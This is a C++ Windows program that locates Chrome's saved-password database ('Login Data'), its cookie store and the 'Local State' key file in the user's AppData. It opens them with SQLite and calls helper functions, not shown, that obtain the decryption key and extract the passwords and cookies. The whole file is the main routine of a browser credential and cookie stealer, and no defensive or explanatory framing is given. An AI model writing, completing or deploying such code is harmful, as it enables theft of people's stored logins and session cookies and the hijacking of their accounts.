#include <iostream>
#include <string>
#include <exception>
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <Shlobj.h>
#include <KnownFolders.h>
#include "json.hpp"
using namespace std;

#include "tools.h"
#include "sqlite3.h"
    
 
typedef std::string String; 
 

int main()
{
	
    try
    {
        sqlite3 *db;        

			char path[MAX_PATH];

			if (!SUCCEEDED(SHGetFolderPath(NULL,CSIDL_LOCAL_APPDATA, NULL, 0, path))) 
			{
				MessageBox(0, "SHGetFolderPath() failed.", 0, MB_OK);
			}
           
			String chrome_pass_path = _T("");
			chrome_pass_path+=path;
			chrome_pass_path += _T("\\Google\\Chrome\\User Data\\Default\\Login Data");
			//cout<<chrome_pass_path;
			String chrome_cookies_path = _T("");
			chrome_cookies_path+=path;
			chrome_cookies_path += _T("\\Google\\Chrome\\User Data\\Default\\Cookies");
			//cout<<chrome_cookies_path;
            String chrome_key_path = _T("");
			chrome_key_path+=path;
			chrome_key_path += _T("\\Google\\Chrome\\User Data\\Local State");
			
        
         
            int rc = sqlite3_open(chrome_pass_path.c_str(), &db);
            if( rc )
            {
                std::cout << "DB Error: " << sqlite3_errmsg(db) << std::endl;
                sqlite3_close(db);
            }
            else
            {
		
				get_encryption_key(chrome_key_path);
                get_chrome_pass(db);
            }

            rc = sqlite3_open(chrome_cookies_path.c_str(), &db);
            if( rc )
            {
                std::cout << "DB Error: " << sqlite3_errmsg(db) << std::endl;
                sqlite3_close(db);
            }
            else
            {
            	get_encryption_key(chrome_key_path);
				get_chrome_cookies(db);
                
            }  

    }
    catch(std::exception &e)
    {
        std::cerr << e.what();
    }

    return 0;
}